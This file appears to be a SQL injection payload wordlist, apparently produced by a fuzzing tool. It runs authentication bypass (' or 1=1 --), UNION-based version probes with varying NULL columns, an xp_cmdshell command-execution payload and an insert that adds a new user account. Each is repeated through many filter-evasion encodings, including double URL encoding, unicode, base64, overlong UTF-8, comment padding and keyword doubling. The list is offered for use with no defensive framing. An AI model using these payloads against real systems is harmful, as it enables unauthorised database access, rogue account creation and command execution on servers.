# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
%00
IyB5b3Ugd2lsbCBuZWVkIHRvIGN1c3RvbWl6ZS9tb2RpZnkgc29tZSBvZiB0aGUgdmF1bGVzIGluIHRoZSBxdWVyaWVzIGZvciBiZXN0IGVmZmVjdAo=
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%2523%2520%2579%256F%2575%2520%2577%2569%256C%256C%2520%256E%2565%2565%2564%2520%2574%256F%2520%2563%2575%2573%2574%256F%256D%2569%257A%2565%252F%256D%256F%2564%2569%2566%2579%2520%2573%256F%256D%2565%2520%256F%2566%2520%2574%2568%2565%2520%2576%2561%2575%256C%2565%2573%2520%2569%256E%2520%2574%2568%2565%2520%2571%2575%2565%2572%2569%2565%2573%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2565%2566%2566%2565%2563%2574%250A
%23%20%79%6F%75%20%77%69%6C%6C%20%6E%65%65%64%20%74%6F%20%63%75%73%74%6F%6D%69%7A%65%2F%6D%6F%64%69%66%79%20%73%6F%6D%65%20%6F%66%20%74%68%65%20%76%61%75%6C%65%73%20%69%6E%20%74%68%65%20%71%75%65%72%69%65%73%20%66%6F%72%20%62%65%73%74%20%65%66%66%65%63%74%0A
%u0023%u0020%u0079%u006F%u0075%u0020%u0077%u0069%u006C%u006C%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0063%u0075%u0073%u0074%u006F%u006D%u0069%u007A%u0065%u002F%u006D%u006F%u0064%u0069%u0066%u0079%u0020%u0073%u006F%u006D%u0065%u0020%u006F%u0066%u0020%u0074%u0068%u0065%u0020%u0076%u0061%u0075%u006C%u0065%u0073%u0020%u0069%u006E%u0020%u0074%u0068%u0065%u0020%u0071%u0075%u0065%u0072%u0069%u0065%u0073%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0065%u0066%u0066%u0065%u0063%u0074%u000A
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%C0%AB%C0%AAyou%C0%AAwill%C0%AAneed%C0%AAto%C0%AAcustomize%C0%AFmodify%C0%AAsome%C0%AAof%C0%AAthe%C0%AAvaules%C0%AAin%C0%AAthe%C0%AAqueries%C0%AAfor%C0%AAbest%C0%AAeffect%C0%8A
%# %y%o%u %w%i%l%l %n%e%e%d %t%o %c%u%s%t%o%m%i%z%e%/%m%o%d%i%f%y %s%o%m%e %o%f %t%h%e %v%a%u%l%e%s %i%n %t%h%e %q%u%e%r%i%e%s %f%o%r %b%e%s%t %e%f%f%e%c%t%

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
 and '0having'='0having'
# you will need to customize/modify some of the vaules in the queries for best effect
sp_password
#/**/you/**/will/**/need/**/to/**/customize/modify/**/some/**/of/**/the/**/vaules/**/in/**/the/**/queries/**/for/**/best/**/effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%01you%02will%0Dneed%08to%09customize/modify%0Csome%09of%0Athe%0Fvaules%0Din%04the%05queries%0Cfor%03best%01effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%0Cyou%0Cwill%0Cneed%0Cto%09customize/modify%0Csome%0Dof%0Dthe%0Bvaules%0Din%0Bthe%0Aqueries%0Bfor%0Bbest%0Beffect

# you will need to customize/modify some of the vaules in the queries for best effect

#+you+will+need+to+customize/modify+some+of+the+vaules+in+the+queries+for+best+effect

#%09you%0Awill%0Dneed%09to%0Acustomize/modify%0Csome%09of%0Dthe%0Cvaules%0Cin%0Athe%09queries%0Dfor%0Cbest%09effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%EF%BC%87; exec master..xp_cmdshell %EF%BC%87ping 10.10.1.2%EF%BC%87--

%00%27; exec master..xp_cmdshell %00%27ping 10.10.1.2%00%27--

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' /*!30796insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
*/
' /*!00000insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
*/
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' ININSERTSERT into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

%C0%AF%C0%AAinsert%C0%AAinto%C0%AAusers%C0%AAlogin%C0%AE%C0%AApassword%C0%AE%C0%AAlevel%C0%AB%C0%AAvalues%C0%AA%C0%AAchar%C0%AA0x70%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x65%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x74%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x65%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x72%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x70%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x65%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x74%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x65%C0%AB%C0%AA%C0%AB%C0%AAchar%C0%AA0x72%C0%AB%C0%AEchar%C0%AA0x64%C0%AB%C0%8A
%' %i%n%s%e%r%t %i%n%t%o %u%s%e%r%s%(%l%o%g%i%n%, %p%a%s%s%w%o%r%d%, %l%e%v%e%l%) %v%a%l%u%e%s%( %c%h%a%r%(%0%x%7%0%) %+ %c%h%a%r%(%0%x%6%5%) %+ %c%h%a%r%(%0%x%7%4%) %+ %c%h%a%r%(%0%x%6%5%) %+ %c%h%a%r%(%0%x%7%2%) %+ %c%h%a%r%(%0%x%7%0%) %+ %c%h%a%r%(%0%x%6%5%) %+ %c%h%a%r%(%0%x%7%4%) %+ %c%h%a%r%(%0%x%6%5%) %+ %c%h%a%r%(%0%x%7%2%)%,%c%h%a%r%(%0%x%6%4%)%

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 and '0having'='0having'
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
-- sp_password
'/**/insert/**/into/**/users(login,/**/password,/**/level)/**/values(/**/char(0x70)/**/+/**/char(0x65)/**/+/**/char(0x74)/**/+/**/char(0x65)/**/+/**/char(0x72)/**/+/**/char(0x70)/**/+/**/char(0x65)/**/+/**/char(0x74)/**/+/**/char(0x65)/**/+/**/char(0x72),char(0x64)

'--zEfrMbHIgM%0Ainsert--NxFpYbTXC%0Ainto--OZRmDHEMiM%0Ausers(login,--UTsqEEd%0Apassword,--nfeqji%0Alevel)--ZPQdOGIR%0Avalues(--hskxbCLeUtK%0Achar(0x70)--dNaBtDtkUI%0A+--fwHfaAzDM%0Achar(0x65)--yDAXywfT%0A+--LFxpJIT%0Achar(0x74)--CSYmnQGzPHdr%0A+--uZEeQiQmebwU%0Achar(0x65)--ykwsQTJsMGh%0A+--sNfqCAEKvj%0Achar(0x72)--oYKfSNOfnQQc%0A+--GcQHPbezLmW%0Achar(0x70)--DvYOkLi%0A+--DThbWFfdOrCO%0Achar(0x65)--gsRVgcfyQW%0A+--EaUSUAjXPhgf%0Achar(0x74)--YMULkIqSx%0A+--gMtEIC%0Achar(0x65)--DPZROrw%0A+--vXaTWjIexbj%0Achar(0x72),char(0x64)--PpAxEzgt%0A
'%23lQzlIO%0Ainsert%23RmaBHBvoqU%0Ainto%23FGFLDoI%0Ausers(login,%23tiwDEhEcGcG%0Apassword,%23moSwjsYmrYu%0Alevel)%23FiNhsw%0Avalues(%23MhkAWAOfOce%0Achar(0x70)%23CJdtfGA%0A+%23sXOvYKAq%0Achar(0x65)%23ENEAloEvbVlZ%0A+%23KZEcQNhwKfM%0Achar(0x74)%23ybEbkyVO%0A+%23gxINTCleFPre%0Achar(0x65)%23FeLoDI%0A+%23gMtbFVtbXs%0Achar(0x72)%23SbUTQRRiGDSS%0A+%23JsPWSPLCWvV%0Achar(0x70)%23slsVpYgRSrZ%0A+%23lLfhgsoMtw%0Achar(0x65)%23voySHOfZfD%0A+%23UBUnCiRmlJ%0Achar(0x74)%23UavBinNaL%0A+%23UowVLkRgj%0Achar(0x65)%23xhXzJgXHUU%0A+%23EICxvRPMIOc%0Achar(0x72),char(0x64)%23YcSgBI%0A
'%23TZQjLhoZaW%0Ainsert%23CZePeikf%0Ainto%23xvEOOR%0Ausers(login,%23nWTbNHKyf%0Apassword,%23TUJtNpwpDa%0Alevel)%23CTVdfq%0Avalues(%23CtsXMO%0Achar(0x70)%23mxOnESEEjuM%0A+%23ClGcGdGnfiMd%0Achar(0x65)%23cLjwTsgf%0A+%23RIPfwPutzBZS%0Achar(0x74)%23ZQsATztGop%0A+%23YbZsErLx%0Achar(0x65)%23GPWUkrsMkn%0A+%23XKRjsNBm%0Achar(0x72)%23NCimYGUmAs%0A+%23FgTzbh%0Achar(0x70)%23yqnmNYpwEZg%0A+%23hnaqBgf%0Achar(0x65)%23eHGxyfvabuo%0A+%23palAAGH%0Achar(0x74)%23LFDKce%0A+%23oCLAutzN%0Achar(0x65)%23uBsjbdoQWVvl%0A+%23crUnggUi%0Achar(0x72),char(0x64)%23pkvcJygVkY%0A
'%03insert%03into%08users(login,%08password,%0Clevel)%0Cvalues(%08char(0x70)%0F+%04char(0x65)%0E+%06char(0x74)%04+%02char(0x65)%0D+%0Bchar(0x72)%07+%06char(0x70)%04+%08char(0x65)%09+%04char(0x74)%0E+%0Fchar(0x65)%01+%0Cchar(0x72),char(0x64)

'%23%0Ainsert%23%0Ainto%23%0Ausers(login,%23%0Apassword,%23%0Alevel)%23%0Avalues(%23%0Achar(0x70)%23%0A+%23%0Achar(0x65)%23%0A+%23%0Achar(0x74)%23%0A+%23%0Achar(0x65)%23%0A+%23%0Achar(0x72)%23%0A+%23%0Achar(0x70)%23%0A+%23%0Achar(0x65)%23%0A+%23%0Achar(0x74)%23%0A+%23%0Achar(0x65)%23%0A+%23%0Achar(0x72),char(0x64)%23%0A
'%0Cinsert%0Cinto%0Cusers(login,%0Cpassword,%09level)%0Dvalues(%0Achar(0x70)%09+%0Achar(0x65)%0C+%0Bchar(0x74)%0D+%09char(0x65)%0C+%0Bchar(0x72)%0C+%0Dchar(0x70)%0C+%0Cchar(0x65)%0A+%0Cchar(0x74)%0C+%0Dchar(0x65)%09+%0Bchar(0x72),char(0x64)

'--%0Ainsert--%0Ainto--%0Ausers(login,--%0Apassword,--%0Alevel)--%0Avalues(--%0Achar(0x70)--%0A+--%0Achar(0x65)--%0A+--%0Achar(0x74)--%0A+--%0Achar(0x65)--%0A+--%0Achar(0x72)--%0A+--%0Achar(0x70)--%0A+--%0Achar(0x65)--%0A+--%0Achar(0x74)--%0A+--%0Achar(0x65)--%0A+--%0Achar(0x72),char(0x64)--%0A
'+insert+into+users(login,+password,+level)+values(+char(0x70)+++char(0x65)+++char(0x74)+++char(0x65)+++char(0x72)+++char(0x70)+++char(0x65)+++char(0x74)+++char(0x65)+++char(0x72),char(0x64)

'%0Cinsert%0Dinto%0Ausers(login,%0Apassword,%09level)%09values(%0Achar(0x70)%0C+%0Achar(0x65)%0C+%09char(0x74)%0C+%0Cchar(0x65)%0C+%0Cchar(0x72)%0A+%09char(0x70)%0C+%09char(0x65)%0A+%0Achar(0x74)%09+%0Dchar(0x65)%0C+%0Dchar(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

%bf%27 insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

%EF%BC%87 or 1=1 --

%00%27 or 1=1 --

' or 1=1 --
%00
JyBvciAxPTEgLS0K
' or 1 BETWEEN 1 AND 1--

' or 1 LIKE 1 --

%2527%2520%256F%2572%2520%2531%253D%2531%2520%252D%252D%250A
%27%20%6F%72%20%31%3D%31%20%2D%2D%0A
%u0027%u0020%u006F%u0072%u0020%u0031%u003D%u0031%u0020%u002D%u002D%u000A
' or 1=1 --

' or 1 LIKE 1 --

' or 1=1 --

' or 1=1 --

' or 1=1 --

' or 1=1 --

' /*!30179or 1=1 */--

' /*!00000or 1=1 */--

' or 1=1 --

' or 1=1 --

%C0%AF%C0%AAor%C0%AA1%C0%BF1%C0%AA%C0%AF%C0%AF%C0%8A
%' %o%r %1%=%1 %-%-%

' or 1=1 --

' or 1=1 --

' or 1=1 --
 and '0having'='0having'
' or 1=1 --
-- sp_password
'/**/or/**/1=1/**/--

'--gJGNaUjhyBOj%0Aor--MQxdqeoyot%0A1=1--HnHBrBSCC%0A----KhQicDdhTd%0A
'%23xJLSEIOTpzL%0Aor%23KyHZuDVMQJ%0A1=1%23EwuxveVJEyb%0A--%23sKvAmvPUtUN%0A
'%23zlEEbxxyuLUt%0Aor%23LwSeYleAETbW%0A1=1%23pJahycFgzEC%0A--%23upvNplyWfFj%0A
'%06or%0E1=1%0F--

'%23%0Aor%23%0A1=1%23%0A--%23%0A
'%0Aor%091=1%09--

'--%0Aor--%0A1=1--%0A----%0A
'+or+1=1+--

'%0Cor%0A1=1%0A--

' or 1=1 --

%bf%27 or 1=1 --

' or 1=1 --

' or 1=1 --

' or 1=1 --

' or 1=1 --

%EF%BC%87 union (select @@version) --

%00%27 union (select @@version) --

' union (select @@version) --
%00
JyB1bmlvbiAoc2VsZWN0IEBAdmVyc2lvbikgLS0K
' union (select @@version) --

' union (select @@version) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0020%u002D%u002D%u000A
' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' /*!30207union (select @@version) */--

' /*!00000union (select @@version) */--

' union (select @@version) --

' UNIUNIONON (SESELECTLECT @@version) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%) %-%-%

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --
 and '0having'='0having'
' union (select @@version) --
-- sp_password
'/**/union/**/(select/**/@@version)/**/--

'--koUGgPbBjvxp%0Aunion--REHPkuSoSUmJ%0A(select--FvLfYTxw%0A@@version)--ofWqRRsNkPs%0A----wNvHbb%0A
'%23hbSmRbHf%0Aunion%23ZcFcuytjjIm%0A(select%23JEclbnW%0A@@version)%23mtuLXANnXdc%0A--%23RpnLdrh%0A
'%23OfdXANBStIL%0Aunion%23fsQjymstW%0A(select%23lVIYKeEfTJc%0A@@version)%23eouJXDwH%0A--%23WOTsZe%0A
'%0Cunion%0B(select%09@@version)%0B--

'%23%0Aunion%23%0A(select%23%0A@@version)%23%0A--%23%0A
'%0Aunion%09(select%0B@@version)%0A--

'--%0Aunion--%0A(select--%0A@@version)--%0A----%0A
'+union+(select+@@version)+--

'%09union%0C(select%0A@@version)%0C--

' union (select @@version) --

%bf%27 union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

' union (select @@version) --

%EF%BC%87 union (select NULL, (select @@version)) --

%00%27 union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --
%00
JyB1bmlvbiAoc2VsZWN0IE5VTEwsIChzZWxlY3QgQEB2ZXJzaW9uKSkgLS0K
' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%254E%2555%254C%254C%252C%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0029%u0020%u002D%u002D%u000A
' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' /*!30896union (select NULL, (select @@version)) */--

' /*!00000union (select NULL, (select @@version)) */--

' union (select NULL, (select @@version)) --

' UNIOUNIONN (SELSELECTECT NULL, (SELSELECTECT @@version)) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AANULL%C0%AE%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-%

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --
 and '0having'='0having'
' union (select NULL, (select @@version)) --
-- sp_password
'/**/union/**/(select/**/NULL,/**/(select/**/@@version))/**/--

'--hPupxexZY%0Aunion--WgcRWRA%0A(select--rliWZwAMoP%0ANULL,--jSutpL%0A(select--mybDgqPDnli%0A@@version))--RhjVNEJs%0A----xuStcFVsZX%0A
'%23WKLWLGL%0Aunion%23vhXCDGhdgZXP%0A(select%23PvuaTZkdIaSz%0ANULL,%23sdOmjXRyzLn%0A(select%23UguaNv%0A@@version))%23bwbUvDZgRkc%0A--%23SNdOoISDZPyC%0A
'%23GkmhBVoOOBQY%0Aunion%23HbdbJPSjVoZ%0A(select%23hqbPVSpaftI%0ANULL,%23eGVEyMkx%0A(select%23mYjlvdtSBF%0A@@version))%23PAGkMg%0A--%23cQVzwuKzw%0A
'%08union%0C(select%01NULL,%08(select%0F@@version))%0B--

'%23%0Aunion%23%0A(select%23%0ANULL,%23%0A(select%23%0A@@version))%23%0A--%23%0A
'%09union%0A(select%0ANULL,%09(select%0B@@version))%09--

'--%0Aunion--%0A(select--%0ANULL,--%0A(select--%0A@@version))--%0A----%0A
'+union+(select+NULL,+(select+@@version))+--

'%0Aunion%0A(select%0DNULL,%0A(select%09@@version))%0C--

' union (select NULL, (select @@version)) --

%bf%27 union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

' union (select NULL, (select @@version)) --

%EF%BC%87 union (select NULL, NULL, (select @@version)) --

%00%27 union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --
%00
JyB1bmlvbiAoc2VsZWN0IE5VTEwsIE5VTEwsIChzZWxlY3QgQEB2ZXJzaW9uKSkgLS0K
' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0029%u0020%u002D%u002D%u000A
' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' /*!30481union (select NULL, NULL, (select @@version)) */--

' /*!00000union (select NULL, NULL, (select @@version)) */--

' union (select NULL, NULL, (select @@version)) --

' UUNIONNION (SELESELECTCT NULL, NULL, (SELESELECTCT @@version)) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %N%U%L%L%, %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-%

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --
 and '0having'='0having'
' union (select NULL, NULL, (select @@version)) --
-- sp_password
'/**/union/**/(select/**/NULL,/**/NULL,/**/(select/**/@@version))/**/--

'--ezxAptQo%0Aunion--OZajyyR%0A(select--xcKWHmOPbX%0ANULL,--yxvWALYp%0ANULL,--KUCzfjWNz%0A(select--aORcqF%0A@@version))--QfHiNz%0A----IQSMosJjL%0A
'%23oENMuplXhtl%0Aunion%23tfWrICXiZDmu%0A(select%23HdXHWxUCU%0ANULL,%23KanffGeY%0ANULL,%23sQIEqbYwPB%0A(select%23IAslYixqBYE%0A@@version))%23cHqYikFUAk%0A--%23gKQPXrp%0A
'%23GVadTrIupRSY%0Aunion%23VcfsYcAqiycS%0A(select%23LwbqPlFVL%0ANULL,%23RWyRHX%0ANULL,%23XcLETvXdiZP%0A(select%23yLWrKU%0A@@version))%23SAuwrjftxTzg%0A--%23QzilcKznyX%0A
'%05union%02(select%0CNULL,%06NULL,%02(select%05@@version))%07--

'%23%0Aunion%23%0A(select%23%0ANULL,%23%0ANULL,%23%0A(select%23%0A@@version))%23%0A--%23%0A
'%09union%0A(select%0CNULL,%0CNULL,%0B(select%0D@@version))%0D--

'--%0Aunion--%0A(select--%0ANULL,--%0ANULL,--%0A(select--%0A@@version))--%0A----%0A
'+union+(select+NULL,+NULL,+(select+@@version))+--

'%0Cunion%0A(select%0DNULL,%0CNULL,%0C(select%0C@@version))%09--

' union (select NULL, NULL, (select @@version)) --

%bf%27 union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

' union (select NULL, NULL, (select @@version)) --

%EF%BC%87 union (select NULL, NULL, NULL,  (select @@version)) --

%00%27 union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --
%00
JyB1bmlvbiAoc2VsZWN0IE5VTEwsIE5VTEwsIE5VTEwsICAoc2VsZWN0IEBAdmVyc2lvbikpIC0tCg==
' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0029%u0020%u002D%u002D%u000A
' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

